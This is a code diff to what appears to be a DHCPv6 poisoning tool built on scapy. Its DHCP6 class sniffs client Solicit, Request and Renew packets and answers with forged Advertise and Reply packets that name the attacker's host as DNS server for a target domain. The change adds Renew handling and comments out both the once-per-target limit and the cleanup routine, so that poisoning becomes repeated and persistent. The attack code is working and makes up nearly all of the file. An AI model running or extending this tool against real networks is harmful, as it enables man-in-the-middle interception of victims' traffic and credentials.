@@ -18,6 +18,8 @@ from scapy.all import (
     DHCP6_Reply,
     DHCP6OptServerId,
     DHCP6OptClientId,
+    DHCP6_Renew,
+    DUID_LL,
 )
 from loguru import logger
 from colorama import Fore, Style
@@ -49,37 +51,54 @@ class DHCP6(PoisonNetwork):
         super().__init__(ip, ipv6, mac_address, iface, info_logger, level)
         self.__domain = domain + "."
 
-    def __generate_ipv6_address(self) -> DHCP6OptIAAddress:
+    def __generate_ipv6_address(self, pkt: packet) -> DHCP6OptIAAddress:
         return DHCP6OptIAAddress(
-            optlen=24, addr="fe80::8577:1", preflft=300, validlft=300
+            addr="fe80::192:168:253:139", preflft=300, validlft=300
         )
+
+    def __server_duid(self) -> DUID_LL:
+        return DUID_LL(lladdr=self.mac_address)
 
     def __advertise_packet(self, pkt: packet, response: packet) -> packet:
         response /= DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
 
         response /= DHCP6OptClientId(duid=pkt[DHCP6_Solicit].duid)
-        response /= DHCP6OptServerId(duid=pkt[DHCP6_Solicit].duid)
+        response /= DHCP6OptServerId(duid=self.__server_duid())
         response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
         response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
         response /= DHCP6OptIA_NA(
             iaid=pkt[DHCP6OptIA_NA].iaid,
             T1=200,
             T2=250,
-            ianaopts=self.__generate_ipv6_address(),
+            ianaopts=self.__generate_ipv6_address(pkt),
         )
         return response
 
-    def __reply_packet(self, pkt: packet, response: packet) -> packet:
+    def __reply_packet_after_request(self, pkt: packet, response: packet) -> packet:
         response /= DHCP6_Reply(trid=pkt[DHCP6_Request].trid)
-        response /= DHCP6OptServerId(duid=pkt[DHCP6_Request].duid)
-        response /= DHCP6OptClientId(duid=pkt[DHCP6_Request].duid)
+        response /= DHCP6OptClientId(duid=pkt[DHCP6OptClientId].duid)
+        response /= DHCP6OptServerId(duid=pkt[DHCP6OptServerId].duid)
         response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
         response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
         response /= DHCP6OptIA_NA(
             iaid=pkt[DHCP6OptIA_NA].iaid,
             T1=200,
             T2=250,
-            ianaopts=self.__generate_ipv6_address(),
+            ianaopts=self.__generate_ipv6_address(pkt),
+        )
+        return response
+
+    def __reply_packet_after_renew(self, pkt: packet, response: packet) -> packet:
+        response /= DHCP6_Reply(trid=pkt[DHCP6_Renew].trid)
+        response /= DHCP6OptClientId(duid=pkt[DHCP6OptClientId].duid)
+        response /= DHCP6OptServerId(duid=pkt[DHCP6OptServerId].duid)
+        response /= DHCP6OptDNSServers(dnsservers=[self.ipv6])
+        response /= DHCP6OptDNSDomains(dnsdomains=[self.__domain])
+        response /= DHCP6OptIA_NA(
+            iaid=pkt[DHCP6OptIA_NA].iaid,
+            T1=200,
+            T2=250,
+            ianaopts=self.__generate_ipv6_address(pkt),
         )
         return response
 
@@ -99,7 +118,15 @@ class DHCP6(PoisonNetwork):
                 self.logger_level,
                 f"{Fore.CYAN}(DHCP6)Capturing REQUEST packet from {pkt[IPv6].src}{Style.RESET_ALL}",
             )
-            response = self.__reply_packet(pkt, response)
+            response = self.__reply_packet_after_request(pkt, response)
+
+        if pkt.haslayer(DHCP6_Renew):
+            self.info_logger.log(
+                self.logger_level,
+                f"{Fore.CYAN}(DHCP6)Capturing RENEW packet from {pkt[IPv6].src}{Style.RESET_ALL}",
+            )
+            response = self.__reply_packet_after_renew(pkt, response)
+
         return response
 
     def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
@@ -111,20 +138,20 @@ class DHCP6(PoisonNetwork):
         """
         self.info_logger.debug("Packet crafted: ")
         self.info_logger.debug(response.summary())
-        if ip_of_the_packet not in self.targets_used:
-            if response.haslayer(DHCP6_Advertise):
-                self.info_logger.log(
-                    self.logger_level,
-                    f"{Fore.CYAN}(DHCP6) Sending dhcp6 ADVERTISE packet to {ip_of_the_packet}{Style.RESET_ALL}",
-                )
-            else:
-                self.info_logger.log(
-                    self.logger_level,
-                    f"{Fore.CYAN}(DHCP6) Sending dhcp6 REPLY packet to {ip_of_the_packet}{Style.RESET_ALL}",
-                )
+        # if ip_of_the_packet not in self.targets_used:
+        if response.haslayer(DHCP6_Advertise):
+            self.info_logger.log(
+                self.logger_level,
+                f"{Fore.CYAN}(DHCP6) Sending dhcp6 ADVERTISE packet to {ip_of_the_packet}{Style.RESET_ALL}",
+            )
+        else:
+            self.info_logger.log(
+                self.logger_level,
+                f"{Fore.CYAN}(DHCP6) Sending dhcp6 REPLY packet to {ip_of_the_packet}{Style.RESET_ALL}",
+            )
 
-            sendp(response, verbose=False)
-            self.targets_used.append(ip_of_the_packet)
+        sendp(response, verbose=False)
+        # self.targets_used.append(ip_of_the_packet)
 
     def __filter_for_dhcp6(self, pkt: packet) -> bool:
         """[ Filter by sniffed packets of interest ]
@@ -138,7 +165,11 @@ class DHCP6(PoisonNetwork):
         return (
             pkt.haslayer(IPv6)
             and pkt[IPv6].dst == "ff02::1:2"
-            and (pkt.haslayer(DHCP6_Request) or pkt.haslayer(DHCP6_Solicit))
+            and (
+                pkt.haslayer(DHCP6_Request)
+                or pkt.haslayer(DHCP6_Solicit)
+                or pkt.haslayer(DHCP6_Renew)
+            )
         )
 
     def __craft_malicious_packets(self, pkt: packet) -> None:
@@ -159,7 +190,7 @@ class DHCP6(PoisonNetwork):
         self.info_logger.log(
             self.logger_level, f"Starting dhcp6 poisoning to attack {self.__domain}"
         )
-        self._start_cleaner()
+        # self._start_cleaner()
         sniff(
             filter="udp and port 547",
             iface=self.iface,
